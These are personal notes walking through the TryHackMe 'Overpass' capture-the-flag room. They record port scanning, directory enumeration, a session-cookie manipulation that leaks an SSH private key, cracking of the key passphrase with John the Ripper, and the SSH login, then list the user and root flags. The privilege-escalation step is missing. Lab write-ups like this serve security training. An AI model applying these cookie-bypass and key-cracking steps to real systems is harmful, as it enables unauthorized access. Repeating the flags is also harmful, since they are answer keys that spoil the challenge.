# TryHack ME room - Overpass Notes

> Kartik Bhushan
> April 17-04-2022

------------------------------------------------

## IP Address - 10.10.144.231 and 10.10.36.158

## Nmap Scan - 
```
FileName - Scanresults



Ports - 80, 22 
80 - Http page
22 - SSH
```


## Running Gobuster/dirbuster - Port 80 
```
/admin - has login.js with custom login script .

Login script source code indicated manipulation of sessioncookie can be done


Upon manipulation - spits out the RSA private key 

Stored in id_rsa
```

## Running Johntheripper
```
sudo john --wordlist=/opt/wordlist/rockyou.txt johnphrase.txt 
[sudo] password for kali: 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
james13          (id_rsa)     
1g 0:00:00:00 DONE (2022-04-17 09:19) 25.00g/s 334200p/s 334200c/s 334200C/s pink25..jackets
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

## Passphrase - james13

## SSH - ssh -i id_rsa James@10.10.114.231 



# 1.Hack the machine and get the flag in user.txt
```
thm{65c1aaf000506e56996822c6281e6bf7}
```

# 2.Escalate your privileges and get the flag in root.txt
```
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

